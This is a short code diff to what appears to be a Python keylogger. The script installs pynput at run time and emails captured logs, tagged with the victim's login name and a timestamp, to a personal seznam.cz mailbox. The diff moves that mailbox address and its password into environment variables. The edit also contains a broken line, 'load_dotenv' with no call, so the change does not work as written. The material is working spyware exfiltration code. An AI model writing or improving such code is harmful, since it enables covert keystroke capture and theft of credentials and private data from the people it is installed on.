@@ -4,6 +4,10 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
+from dotenv import load_dotenv
+
+load_dotenv
+
 
 pip.main(["install", "--user", "pynput"])
 pip.main(["install", "--user", "datetime"])
@@ -27,9 +31,9 @@ def sendMail():
     dateNow = datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S")
 
     #Email Variables
-    email_user = "oplpet0@seznam.cz"
-    email_send = "oplpet0@seznam.cz"
-    email_password = "----"
+    email_user = os.getenv("EMAIL")
+    email_send = os.getenv("EMAIL")
+    email_password = os.getenv("PASSWORD")
     subject = f"{logNumber}. {os.getlogin()} {dateNow} Log"
     
     #Formating the email message
